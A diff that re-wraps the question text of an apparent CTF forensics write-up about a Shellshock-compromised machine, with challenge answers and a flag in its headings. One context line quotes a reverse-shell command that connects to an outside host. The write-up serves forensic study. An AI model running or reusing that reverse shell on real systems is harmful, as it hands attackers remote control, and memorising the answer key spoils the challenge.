@@ -74,7 +74,13 @@ Doing this gives us our answer, **b8ac3e1c12235ec54580131a511f2c9a**
 ## Forensics Question 2 correct (CVE-2014-6271) - 3 pts
 
 ```text
-Alas! The dreadful news has reached our ears. The malevolent presence of the Dark Lord Sauron looms over us, for he has insidiously infiltrated our very midst. Through his treacherous machinations, he has exploited a most ancient and forgotten vulnerability to gain access to our sacred realm of the computer. Like a cunning serpent, he has slithered through the digital shadows, utilizing this exploit as a nefarious key to breach our defenses. I beseech thee, wise one, to reveal the knowledge of the initial Common Vulnerabilities and Exposures (CVE) identification that pertains to this wickedly employed exploit. Only through such understanding may we begin to fathom the depths of his dark intentions and devise a plan to thwart his maleficent schemes.
+Alas! The dreadful news has reached our ears. The malevolent presence of the Dark Lord Sauron looms over us, for he has
+insidiously infiltrated our very midst. Through his treacherous machinations, he has exploited a most ancient and forgotten
+vulnerability to gain access to our sacred realm of the computer. Like a cunning serpent, he has slithered through the
+digital shadows, utilizing this exploit as a nefarious key to breach our defenses. I beseech thee, wise one, to reveal
+the knowledge of the initial Common Vulnerabilities and Exposures (CVE) identification that pertains to this wickedly
+employed exploit. Only through such understanding may we begin to fathom the depths of his dark intentions and devise
+a plan to thwart his maleficent schemes.
 
 ANSWER: 
 ```
@@ -90,7 +96,13 @@ This is a very old and well-known exploit called Shell Shock. Looking up "shell 
 ## Forensics Question 3 correct (1689208527) - 3 pts
 
 ```text
-With utmost urgency, we must embark upon a thorough investigation into the depths of this exploit that has beset us. As we tread this treacherous path, let us not falter in our quest for knowledge. Nay, we shall leave no stone unturned and no log unread in our relentless pursuit of the truth. Pray, enlightened beings, reveal unto us the elusive hour in Unix timestamp form, when the sinister Sauron, with his malicious intent, exploited our machine. Only by unraveling the fabric of time itself, represented in those cryptic numerical digits, shall we uncover the dark secret he concealed within the digital tapestry, and thus forge a defense against his insidious advances. Arise, my companions, and let our combined wisdom shine like a beacon amidst the shadows of uncertainty!
+With utmost urgency, we must embark upon a thorough investigation into the depths of this exploit that has beset us. As we
+tread this treacherous path, let us not falter in our quest for knowledge. Nay, we shall leave no stone unturned and no log
+unread in our relentless pursuit of the truth. Pray, enlightened beings, reveal unto us the elusive hour in Unix timestamp
+form, when the sinister Sauron, with his malicious intent, exploited our machine. Only by unraveling the fabric of time itself,
+represented in those cryptic numerical digits, shall we uncover the dark secret he concealed within the digital tapestry, and
+thus forge a defense against his insidious advances. Arise, my companions, and let our combined wisdom shine like a beacon
+amidst the shadows of uncertainty!
 
 ANSWER:
 ```
@@ -108,7 +120,12 @@ Thus we get our answer **1689208527**
 
 ## Forensics Question 4 correct (42123) - 3 pts
 ```text
-Ah, the knowledge we seek grows ever more profound! Tell me, in the wake of Sauron's insidious exploit and the planting of his initial payload, which port does his wicked reverse shell employ? This vital piece of information shall unveil the path through which his malicious influence infiltrates our digital domain. With our collective wisdom and the power of discernment, we shall decipher this enigma, unmasking the port that binds Sauron's dark machinations to our noble system. Let our minds unite, valiant companions, and shed light upon the shadows that cloak his malevolence, for in doing so, we shall fortify our defenses and stand steadfast against the forces of darkness.
+Ah, the knowledge we seek grows ever more profound! Tell me, in the wake of Sauron's insidious exploit and the planting of his
+initial payload, which port does his wicked reverse shell employ? This vital piece of information shall unveil the path through
+which his malicious influence infiltrates our digital domain. With our collective wisdom and the power of discernment, we shall
+decipher this enigma, unmasking the port that binds Sauron's dark machinations to our noble system. Let our minds unite, valiant
+companions, and shed light upon the shadows that cloak his malevolence, for in doing so, we shall fortify our defenses and stand
+steadfast against the forces of darkness.
 
 ANSWER:
 ```
@@ -130,7 +147,11 @@ Following the format, the reverse shell `/bin/sh -i >& /dev/tcp/eth007.me/42123 
 
 ## Forensics Question 5 correct (/usr/lib/nenya) - 3 pts
 ```text
-I bring grave tidings, for within the realms of this system, a file harbors the vulnerability of plaintext passwords. The very essence of security is at stake. Pray, reveal unto us the absolute path that governs this perilous file, so that we may tread cautiously and shield these delicate secrets from the prying eyes of malevolent forces. With vigilance and fortitude, let us ensure the safeguarding of sensitive information, preserving the sanctity of our digital realm and fortifying our defenses against the lurking shadows of cyber threats.
+I bring grave tidings, for within the realms of this system, a file harbors the vulnerability of plaintext passwords. The very
+essence of security is at stake. Pray, reveal unto us the absolute path that governs this perilous file, so that we may tread
+cautiously and shield these delicate secrets from the prying eyes of malevolent forces. With vigilance and fortitude, let us
+ensure the safeguarding of sensitive information, preserving the sanctity of our digital realm and fortifying our defenses
+against the lurking shadows of cyber threats.
 
 ANSWER: 
 ```
@@ -152,7 +173,12 @@ Analyzing this file, we see that it is very obviously the plaintext password fil
 
 ## Forensics Question 6 correct (1209234) - 3 pts
 ```text
-The treacherous Saruman, in his pursuit of malevolent knowledge, sought to exploit a vulnerability within the noble Boa web server. In his nefarious efforts to aid Saruman's future exploits, the vile Sauron, with his twisted machinations, meddled with a key variable that wields influence over the very essence of Boa's operation. Pray, reveal unto us the altered value to which this variable was tampered, for within its tainted state lies the secret that binds Saruman's dark designs to the heart of our digital realm. Through our collective wisdom and tireless perseverance, let us restore the integrity of this variable and ensure the noble Boa web server remains fortified against the forces of darkness that seek to exploit it.
+The treacherous Saruman, in his pursuit of malevolent knowledge, sought to exploit a vulnerability within the noble Boa web
+server. In his nefarious efforts to aid Saruman's future exploits, the vile Sauron, with his twisted machinations, meddled
+with a key variable that wields influence over the very essence of Boa's operation. Pray, reveal unto us the altered value
+to which this variable was tampered, for within its tainted state lies the secret that binds Saruman's dark designs to the
+heart of our digital realm. Through our collective wisdom and tireless perseverance, let us restore the integrity of this
+variable and ensure the noble Boa web server remains fortified against the forces of darkness that seek to exploit it.
 
 ANSWER: 
 ```
@@ -172,7 +198,12 @@ Because setting the value of this variable to a high number like "1209234", it m
 ## Forensics Question 7 correct (melkor) - 3 pts
 
 ```text
-Behold, fellow seekers of truth! A dire discovery has come to pass—the very fabric of a key system binary has been tampered with. Though the mischievous hand that wrought this disturbance has since departed, a lingering enigma remains: What is the elusive username of the user responsible for the creation of this deceitful contrivance? Together, let us delve into the annals of our digital realm, unraveling the threads of history and unlocking the secrets that lie dormant within the code. With steadfast resolve and keen insight, we shall unmask the identity of this elusive figure, ensuring that justice be served and the foundations of our noble system restored to their rightful state.
+Behold, fellow seekers of truth! A dire discovery has come to pass—the very fabric of a key system binary has been tampered
+with. Though the mischievous hand that wrought this disturbance has since departed, a lingering enigma remains: What is the
+elusive username of the user responsible for the creation of this deceitful contrivance? Together, let us delve into the
+annals of our digital realm, unraveling the threads of history and unlocking the secrets that lie dormant within the code.
+With steadfast resolve and keen insight, we shall unmask the identity of this elusive figure, ensuring that justice be served
+and the foundations of our noble system restored to their rightful state.
 
 ANSWER: 
 ```
@@ -212,7 +243,12 @@ This makes the answer to our Forensics Question **melkor**
 ## Forensics Question 8 correct (/usr/share/cowsay/cows/fox.cow) - 3 pts
 
 ```text
-Reveal unto us, with utmost clarity, the absolute path that conceals the tampered file of the beloved cowsay cow. In our digital domain, where whimsy and mirth intertwine, this cherished companion has fallen victim to wicked tampering. With steadfast determination and a resolute spirit, guide us towards the sacred location wherein the tampered cowsay cow file resides. Through the illumination of this absolute path, we shall embark upon a restorative quest, mending the fractured essence of this delightful bovine and reinstating its joyful presence to our digital abode. Share with us, valiant companions, the absolute path that unlocks the gate to our restorative endeavors!
+Reveal unto us, with utmost clarity, the absolute path that conceals the tampered file of the beloved cowsay cow. In our
+digital domain, where whimsy and mirth intertwine, this cherished companion has fallen victim to wicked tampering. With
+steadfast determination and a resolute spirit, guide us towards the sacred location wherein the tampered cowsay cow file
+resides. Through the illumination of this absolute path, we shall embark upon a restorative quest, mending the fractured
+essence of this delightful bovine and reinstating its joyful presence to our digital abode. Share with us, valiant
+companions, the absolute path that unlocks the gate to our restorative endeavors!
 
 ANSWER: 
 ```
@@ -255,7 +291,12 @@ This means the answer to the Forensics Question is **/usr/share/cowsay/cows/fox.
 ## Forensics Question 9 correct (jctf{d0nt_believe_every_l0g_u_see}) - 3 pts
 
 ```text
-Ah, the intrigue of a secret message beckons us! A cryptic revelation lies concealed within the depths of the DNF (Dandified Yum) history, awaiting our discerning gaze. Pray, share with us the enigmatic message that has been left behind, nestled amidst the annals of this storied repository. Through our collective wisdom and keen perception, we shall unravel the veiled words, transcending the barriers of time and code to reveal the hidden truths that yearn to be discovered. Let us embark upon this quest together, illuminating the path that leads to the heart of this clandestine message, where enlightenment and revelation await our curious minds.
+Ah, the intrigue of a secret message beckons us! A cryptic revelation lies concealed within the depths of the DNF
+(Dandified Yum) history, awaiting our discerning gaze. Pray, share with us the enigmatic message that has been left
+behind, nestled amidst the annals of this storied repository. Through our collective wisdom and keen perception, we
+shall unravel the veiled words, transcending the barriers of time and code to reveal the hidden truths that yearn
+to be discovered. Let us embark upon this quest together, illuminating the path that leads to the heart of this
+clandestine message, where enlightenment and revelation await our curious minds.
 
 ANSWER: 
 ```
@@ -292,7 +333,14 @@ Doing this shows packages in CTF flag format, which makes our Forensics Question
 ## Forensics Question 10 correct (/var/adm/power-manager) - 3 pts
 
 ```text
-Behold, a foreboding revelation! A treacherous scheme has unfolded, for someone hath surreptitiously sown a hidden backdoor within our digital realm. As I cast my discerning gaze upon the threads of this malicious design, a flicker of insight emerges. Methinks this backdoor lurks in the domain of power management, concealing its presence amidst the very currents that govern the flow of power within our digital abode. With the strength of our collective wisdom and the guiding light of our shared purpose, we shall embark upon a quest to expose this hidden passage. Together, let us journey through the labyrinth of code, unearthing the deceit that seeks to undermine our digital fortitude. Fear not, for the combined forces of our vigilance shall banish this backdoor to the shadows whence it came, restoring the integrity and security of our noble domain.
+Behold, a foreboding revelation! A treacherous scheme has unfolded, for someone hath surreptitiously sown a hidden backdoor
+within our digital realm. As I cast my discerning gaze upon the threads of this malicious design, a flicker of insight
+emerges. Methinks this backdoor lurks in the domain of power management, concealing its presence amidst the very currents
+that govern the flow of power within our digital abode. With the strength of our collective wisdom and the guiding light
+of our shared purpose, we shall embark upon a quest to expose this hidden passage. Together, let us journey through the
+labyrinth of code, unearthing the deceit that seeks to undermine our digital fortitude. Fear not, for the combined forces
+of our vigilance shall banish this backdoor to the shadows whence it came, restoring the integrity and security of our
+noble domain.
 
 ANSWER: 
 ```
